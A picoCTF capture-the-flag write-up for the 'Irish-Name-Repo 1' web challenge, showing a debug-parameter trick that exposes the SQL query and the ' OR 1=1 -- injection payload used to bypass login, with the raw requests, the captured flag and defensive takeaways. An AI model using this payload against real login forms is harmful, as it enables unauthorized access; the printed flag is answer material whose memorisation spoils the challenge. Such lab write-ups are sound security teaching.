# 🐍 Irish-Name-Repo 1 — picoCTF Writeup

> **Challenge:** Irish-Name-Repo 1
> **Category:** Web Exploitation / SQL Injection
> **Platform:** picoCTF
> **Target:** `http://fickle-tempest.picoctf.net:55823`

---

## 📌 Challenge Description

> Do you think you can log us in? Try to see if you can login!

The goal of this challenge is to bypass the login mechanism.

While inspecting the login request with **Burp Suite**, we discover a `debug` parameter that reveals the SQL query being executed. This gives us enough information to identify and exploit a **SQL Injection** vulnerability.

---

## 🌐 Step 1 — Open the Login Page

I first navigated to:

```text
http://fickle-tempest.picoctf.net:55823/login.html
```

I entered some random credentials:

```text
Username: admin
Password: admin
```

The login failed, but Burp Suite captured the request.

---

## 🕵️ Step 2 — Inspect the Login Request

The request sent by the browser was:

```http
POST /login.php HTTP/1.1
Host: fickle-tempest.picoctf.net:55823
Content-Length: 37
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin&debug=0
```

The interesting part is:

```text
debug=0
```

Since this is a parameter controlled by the client, I decided to see what happens if we change it.

---

## 🔍 Step 3 — Enable Debug Mode

I sent the request to **Burp Suite → Repeater** and changed:

```text
debug=0
```

to:

```text
debug=1
```

The modified request became:

```http
POST /login.php HTTP/1.1
Host: fickle-tempest.picoctf.net:55823
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin&debug=1
```

The server response was now different.

```html
<pre>
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
</pre>

<h1>Login failed.</h1>
```

---

## 💡 Step 4 — Identify the SQL Injection

The debug output reveals the exact SQL query:

```sql
SELECT * FROM users WHERE name='admin' AND password='admin'
```

This is a major clue.

The username and password are being inserted directly into the SQL query without proper sanitization or parameterization.

Conceptually, the application is doing something like:

```sql
SELECT * FROM users
WHERE name='<username>'
AND password='<password>'
```

If we can manipulate the `password` value, we may be able to change the logic of the SQL query.

---

## 💉 Step 5 — Perform SQL Injection

I used the following password payload:

```text
' OR 1=1 --
```

So the request body became:

```text
username=admin&password=' OR 1=1 --&debug=1
```

The resulting SQL query would effectively become:

```sql
SELECT * FROM users
WHERE name='admin'
AND password='' OR 1=1 --'
```

The important part is:

```sql
OR 1=1
```

Since:

```sql
1=1
```

is always true, the authentication condition can be bypassed.

The `--` starts a SQL comment, causing the remainder of the query to be ignored.

---

## 🚩 Step 6 — Retrieve the Flag

After sending the modified request through Burp Repeater, the login was successfully bypassed.

The server returned:

```text
Your flag is: picoCTF{s0m3_SQL_85832275}
```

---

# 🏁 Final Flag

```text
picoCTF{s0m3_SQL_85832275}
```

---

## 🧠 Vulnerability Explained

The application is vulnerable because user-controlled input is directly concatenated into an SQL query.

### Vulnerable query construction

```text
username → SQL query
password → SQL query
```

Instead of using parameterized queries, the application effectively constructs:

```sql
SELECT * FROM users WHERE name='<input>' AND password='<input>'
```

This allows an attacker to inject SQL syntax into the query.

### Our payload

```text
' OR 1=1 --
```

Changes the logic of the query so that the authentication condition becomes true.

---

## 🔄 Attack Flow

```text
Open login.html
       │
       ▼
Enter random credentials
       │
       ▼
Intercept POST request with Burp Suite
       │
       ▼
Notice debug=0
       │
       ▼
Change debug=0 → debug=1
       │
       ▼
SQL query is exposed
       │
       ▼
Identify SQL Injection
       │
       ▼
Password:
' OR 1=1 --
       │
       ▼
Authentication bypass
       │
       ▼
picoCTF{s0m3_SQL_85832275}
```

---

## 🛠️ Tool Used

* **Burp Suite**

  * Proxy → Intercept
  * Repeater

---

## 🔑 Key Takeaways

* Always inspect parameters sent by web applications.
* Debug functionality can accidentally expose sensitive implementation details.
* SQL queries should never be constructed by directly concatenating user input.
* **Prepared statements / parameterized queries** are the proper defense against SQL injection.
* Burp Repeater makes it easy to modify parameters and test how the server responds.

---

**Challenge solved! 🎉**
